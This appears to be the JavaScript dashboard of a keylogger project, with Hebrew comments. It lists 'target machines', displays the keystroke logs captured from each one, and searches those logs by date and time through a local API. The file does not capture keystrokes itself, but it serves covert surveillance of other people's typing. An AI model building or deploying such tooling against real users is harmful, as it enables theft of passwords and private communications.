const BASE_URL = "http://127.0.0.1:5000";
let selectedMachine = null; // נשמור את המחשב שנבחר

// טוען את רשימת המחשבים
async function loadMachines() {
  try {
    const response = await fetch(`${BASE_URL}/api/get_target_machines_list`);
    const machines = await response.json();

    const list = document.getElementById("machines-list");
    list.innerHTML = "";

    if (machines.length === 0) {
      list.innerHTML = "<li>אין נתונים זמינים</li>";
      return;
    }

    machines.forEach(machine => {
      const li = document.createElement("li");
      const btn = document.createElement("button");
      btn.textContent = `הצג הקשות מ: ${machine}`;
      btn.onclick = () => loadKeystrokes(machine);
      li.appendChild(btn);
      list.appendChild(li);
    });
  } catch (err) {
    console.error("שגיאה בטעינת רשימת מחשבים:", err);
  }
}

// טוען את ההקלדות של מחשב מסוים
async function loadKeystrokes(machine) {
  try {
    selectedMachine = machine; // שומרים את המחשב שנבחר
    const response = await fetch(`${BASE_URL}/api/get_keystrokes?machine=${machine}`);
    const data = await response.json();

    renderLogs(data, machine);
  } catch (err) {
    console.error("שגיאה בטעינת ההקלדות:", err);
  }
}

// מציג את הלוגים במסך
function renderLogs(data, machine) {
  const output = document.getElementById("keystrokes-output");

  if (!data || data.length === 0) {
    output.textContent = `לא נמצאו הקלדות עבור ${machine}`;
    return;
  }

  let result = "";
  data.forEach((log, idx) => {
    try {
      const parsed = JSON.parse(log);
      result += `📄 לוג ${idx + 1}:\n${JSON.stringify(parsed, null, 2)}\n\n`;
    } catch {
      result += `📄 לוג ${idx + 1}:\n${log}\n\n`;
    }
  });

  output.textContent = result;
}

// חיפוש לפי תאריך ושעה
async function searchLogs() {
  const date = document.getElementById("search-date").value;
  const time = document.getElementById("search-time").value;

  if (!selectedMachine) {
    alert("בחר מחשב קודם!");
    return;
  }

  if (!date) {
    alert("אנא הכנס תאריך");
    return;
  }

  const response = await fetch(`${BASE_URL}/api/get_keystrokes?machine=${selectedMachine}`);
  const data = await response.json();

  let filtered = data.filter(log => {
    try {
      // בודק אם יש התאמה לתאריך ושעה בשם התוכן
      if (log.includes(date)) {
        if (!time || log.includes(time)) {
          return true;
        }
      }
    } catch {}
    return false;
  });

  renderLogs(filtered, selectedMachine);
}
